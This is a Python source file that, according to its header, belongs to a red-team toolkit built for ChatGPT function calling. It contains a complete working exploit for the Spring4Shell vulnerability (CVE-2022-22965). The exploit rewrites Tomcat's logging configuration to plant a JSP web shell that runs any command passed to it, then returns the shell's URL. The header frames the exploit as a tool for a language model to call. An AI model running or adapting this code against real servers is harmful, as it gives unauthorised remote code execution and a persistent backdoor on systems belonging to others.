#!/usr/bin/env python
#coding:utf-8

"""
@software: ChatGPT Function Call Red Team Tools
@author: magicming200
@site: https://github.com/magicming200
@time: 2023/11/05 22:28
"""
import time
from urllib.parse import urlparse
import requests
from tool.tool import print_gray


def exploit_vulnerability_CVE_2022_22965(url):
    '''
    Detect whether the CVE-2022-22965 vulnerability exists in the target url.
    If a vulnerability exists, write a webshell and return the webshell address.
    CVE-2022-22965:A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.
    More vulnerability details:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965
    EXP codes modified based on the code of https://github.com/reznok/Spring4Shell-POC, thanks reznok.
    :param url:target url
    :return:Return exploit results
    '''
    if len(url)==0:
        return 'Target url cannot be empty.'
    # Set to bypass errors if the target site has SSL issues
    requests.packages.urllib3.disable_warnings()
    post_header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    get_header = {
        "prefix": "<%",
        "suffix": "%>//",
        # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
        "c": "Runtime",
    }
    dir = 'webapps/ROOT'
    file_name = 'shell'
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={dir}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={file_name}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    exploit_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    print_gray('[*] Resetting Log Variables.')
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    response = requests.post(url, headers=post_header, data=file_date_data, verify=False)
    status_code_1 = response.status_code
    print_gray('[*] Response code: %d' % response.status_code)

    # Change the tomcat log location variables
    print_gray('[*] Modifying Log Configurations')
    response = requests.post(url, headers=post_header, data=exploit_data, verify=False)
    status_code_2 = response.status_code
    print_gray('[*] Response code: %d' % response.status_code)

    # Changes take some time to populate on tomcat
    time.sleep(3)

    # Send the packet that writes the web shell
    print_gray('[*] Write the web shell')
    response = requests.get(url, headers=get_header, verify=False)
    status_code_3 = response.status_code
    print_gray('[*] Response Code: %d' % response.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print_gray('[*] Resetting Log Variables.')
    response = requests.post(url, headers=post_header, data=pattern_data, verify=False)
    status_code_4 = response.status_code
    print_gray('[*] Response code: %d' % response.status_code)

    if status_code_1 != 200 or status_code_2 != 200 or status_code_3 != 200 or status_code_4 != 200:
        return 'CVE-2022-22965 vulnerability exploit failed.'
    elif status_code_1 == 200 or status_code_2 == 200 or status_code_3 == 200 or status_code_4 == 200:
        shell_address = urlparse(url).scheme + "://" + urlparse(url).netloc + "/" + file_name + ".jsp"
        return 'CVE-2022-22965 vulnerability exploit successful. Webshell address: ' + shell_address + '?cmd=whoami'


if __name__ == "__main__":
    pass


